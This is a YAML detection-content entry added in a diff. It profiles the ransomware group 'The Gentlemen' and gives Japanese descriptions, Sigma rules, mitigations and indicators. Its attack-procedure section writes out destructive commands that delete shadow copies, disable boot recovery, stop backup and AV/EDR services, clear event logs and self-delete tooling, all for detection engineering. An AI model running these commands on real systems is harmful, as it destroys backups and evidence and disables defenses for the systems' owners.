@@ -1,0 +1,174 @@
+id: ADS-011
+title: "Data Destruction - VSS Deletion & Windows Event Log Clearing"
+actor: "The Gentlemen"
+aliases:
+  - "Gentleman"
+  - "Gentlemen RaaS"
+  - "Hastalamuerte"
+created: "2026-06-25"
+mitre_technique:
+  id: "T1485"
+  name: "Data Destruction"
+  url: "https://attack.mitre.org/techniques/T1485"
+related_techniques:
+  - id: "T1070.001"
+    name: "Indicator Removal: Clear Windows Event Logs"
+    url: "https://attack.mitre.org/techniques/T1070/001"
+platform:
+  - "Windows"
+phase: "Impact / Defense Evasion"
+
+description: |
+  ランサムウェア展開直前に、The Gentlemen はバックアップからの復旧を不可能にするため
+  すべてのボリュームシャドウコピーを削除し、バックアップ/DB/AV サービスを強制終了する。
+  また Security/System/Application イベントログ、RDP ログを wevtutil で消去し、
+  セルフデリートバッチスクリプトでツールのアーティファクトを除去する。
+
+attack_procedure: |
+  # ===== ボリュームシャドウコピーの削除 =====
+  # ステップ 1: vssadmin でシャドウコピーを削除
+  vssadmin delete shadows /all /quiet
+
+  # ステップ 2: wmic でシャドウコピーを削除
+  wmic shadowcopy delete
+
+  # ステップ 3: bcdedit でリカバリを無効化
+  bcdedit /set {default} bootstatuspolicy ignoreallfailures
+  bcdedit /set {default} recoveryenabled no
+
+  # ===== バックアップ・DB・AV サービスの停止 =====
+  # ステップ 4: バックアップ関連サービスの停止
+  net stop "Acronis VSS Provider" /y
+  net stop "SQLsafe Backup Service" /y
+  net stop "Veeam Backup Catalog Data Service" /y
+  net stop "SQLWriter" /y
+  net stop MSSQLSERVER /y
+  net stop MSSQLServerOLAPService /y
+
+  # ステップ 5: セキュリティサービスの停止 (AV/EDR)
+  net stop WinDefend /y
+  net stop "Sophos Agent" /y
+  net stop "Carbon Black" /y
+
+  # ===== Windows イベントログのクリア =====
+  # ステップ 6: 主要イベントログを wevtutil で消去
+  wevtutil cl System
+  wevtutil cl Security
+  wevtutil cl Application
+  wevtutil cl "Windows PowerShell"
+  wevtutil cl "Microsoft-Windows-PowerShell/Operational"
+  wevtutil cl "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational"
+  wevtutil cl "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational"
+
+  # ステップ 7: セルフデリートバッチスクリプトでツールのクリーンアップ
+  echo del C:\Temp\* /f /q > C:\Temp\cleanup.bat
+  echo del C:\Temp\cleanup.bat >> C:\Temp\cleanup.bat
+  cmd /c C:\Temp\cleanup.bat
+
+tools_used:
+  - name: "vssadmin.exe"
+    description: "Windows 標準のボリュームシャドウコピー管理"
+  - name: "wmic.exe"
+    description: "Windows 管理インターフェース (シャドウコピー削除)"
+  - name: "bcdedit.exe"
+    description: "Windows ブート設定の変更"
+  - name: "net.exe"
+    description: "Windows サービス停止"
+  - name: "wevtutil.exe"
+    description: "Windows イベントログのクリア"
+
+detection:
+  log_sources:
+    - "Windows Security Event Log (消去前に取得が必要)"
+    - "Sysmon"
+    - "EDR テレメトリ"
+    - "SIEM (リアルタイム転送必須)"
+  expected_events:
+    - "EventID 524: システム監査ログが消去された"
+    - "EventID 1102: 監査ログが消去された"
+    - "Sysmon EventID 1: vssadmin.exe delete shadows /all の実行"
+    - "Sysmon EventID 1: wmic shadowcopy delete の実行"
+    - "Sysmon EventID 1: bcdedit /set recoveryenabled no の実行"
+    - "Sysmon EventID 1: wevtutil cl の実行"
+    - "EventID 7036: 大量のサービスが停止状態に移行"
+  detection_rule: |
+    title: Volume Shadow Copy Deletion - Ransomware Pre-Deployment Indicator
+    id: a1b2c3d4-0011-0011-0011-000000000011
+    status: experimental
+    description: Detects VSS deletion commands commonly used by ransomware actors including The Gentlemen
+    logsource:
+      product: windows
+      category: process_creation
+    detection:
+      selection_vssadmin:
+        Image|endswith: '\vssadmin.exe'
+        CommandLine|contains|all:
+          - 'delete'
+          - 'shadows'
+      selection_wmic:
+        Image|endswith: '\wmic.exe'
+        CommandLine|contains|all:
+          - 'shadowcopy'
+          - 'delete'
+      selection_bcdedit:
+        Image|endswith: '\bcdedit.exe'
+        CommandLine|contains: 'recoveryenabled'
+      condition: selection_vssadmin or selection_wmic or selection_bcdedit
+    falsepositives:
+      - Legitimate backup management (rare)
+    level: critical
+    tags:
+      - attack.impact
+      - attack.t1485
+
+  additional_detection: |
+    title: Windows Event Log Cleared - Indicator Removal
+    id: a1b2c3d4-0011-0011-0011-000000000011b
+    status: stable
+    description: Detects clearing of Windows event logs
+    logsource:
+      product: windows
+      service: security
+    detection:
+      selection:
+        EventID:
+          - 1102
+          - 524
+      condition: selection
+    level: high
+    tags:
+      - attack.defense_evasion
+      - attack.t1070.001
+
+  mitigations:
+    - "イベントログをリアルタイムで SIEM に転送 (ログ消去前に保全)"
+    - "vssadmin/wmic の使用を Application Control で制限"
+    - "VSS 削除コマンドの実行を EDR/SIEM でリアルタイム検知・ブロック"
+    - "クラウドまたはオフプレミスのバックアップを維持 (3-2-1 バックアップルール)"
+    - "バックアップシステムへの管理者アクセスを分離"
+    - "EDR の Tamper Protection を有効化"
+
+ioc:
+  hashes: []
+  file_names:
+    - "cleanup.bat"
+  commands:
+    - "vssadmin delete shadows /all /quiet"
+    - "wmic shadowcopy delete"
+    - "wevtutil cl Security"
+    - "bcdedit /set {default} recoveryenabled no"
+  notes: |
+    VSS 削除とイベントログの消去はランサムウェア展開直前に実行される。
+    SIEM へのリアルタイムログ転送がなければ、これらの証跡は失われる。
+
+references:
+  - source: "Huntress"
+    url: "https://www.huntress.com/blog/the-gentlemen-ransomware-defense-evasion-ttps"
+  - source: "Microsoft Security Blog"
+    url: "https://www.microsoft.com/en-us/security/blog/2026/05/28/the-gentlemen-ransomware-dissecting-a-self-propagating-go-encryptor/"
+  - source: "Trend Micro"
+    url: "https://www.trendmicro.com/en_us/research/25/i/unmasking-the-gentlemen-ransomware.html"
+  - source: "MITRE ATT&CK T1485"
+    url: "https://attack.mitre.org/techniques/T1485"
+  - source: "MITRE ATT&CK T1070.001"
+    url: "https://attack.mitre.org/techniques/T1070/001"
